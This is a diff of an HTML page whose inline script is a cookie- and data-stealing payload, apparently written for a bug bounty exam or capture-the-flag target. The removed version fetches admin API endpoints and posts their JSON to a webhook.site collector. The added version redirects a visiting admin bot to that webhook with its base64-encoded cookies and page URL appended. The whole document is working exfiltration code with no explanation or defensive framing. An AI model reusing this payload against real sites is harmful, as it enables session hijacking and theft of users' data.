@@ -2,37 +2,12 @@
 <html>
 <body>
     <script>
-        async function huntFlags() {
-            const webhook = 'https://webhook.site/56b0b051-9161-4764-a305-ef35995f1de4';
-            
-            // 1. List of API endpoints that usually hold the "Big" flags
-            const endpoints = [
-                '/api/admin/system/info',
-                '/api/admin/stats',
-                '/api/bookings/all',
-                '/api/admin/config'
-            ];
-
-            for (let url of endpoints) {
-                try {
-                    const r = await fetch('https://api-bugbounty-exam.hashacademy.co' + url);
-                    const data = await r.json();
-                    
-                    // Send any JSON we find to the webhook
-                    fetch(webhook + '/API_LEAK', {
-                        method: 'POST',
-                        mode: 'no-cors',
-                        body: JSON.stringify({path: url, content: data})
-                    });
-                } catch(e) {}
-            }
-
-            // 2. Final check: Look for that "internalNotes" field you found before
-            // but in the admin's global view
-            window.location.href = "https://bugbounty-exam.hashacademy.co/admin/messages";
-        }
-
-        huntFlags();
+        // No fetch, no waiting. Just a direct, aggressive redirect.
+        // We attach the cookies to the URL so they show up in your Webhook logs.
+        const webhook = "https://webhook.site/56b0b051-9161-4764-a305-ef35995f1de4";
+        
+        // This line tries to grab the cookies and send the bot to your webhook instantly
+        window.location.href = webhook + "/?cookie=" + btoa(document.cookie) + "&origin=" + btoa(window.location.href);
     </script>
 </body>
 </html>
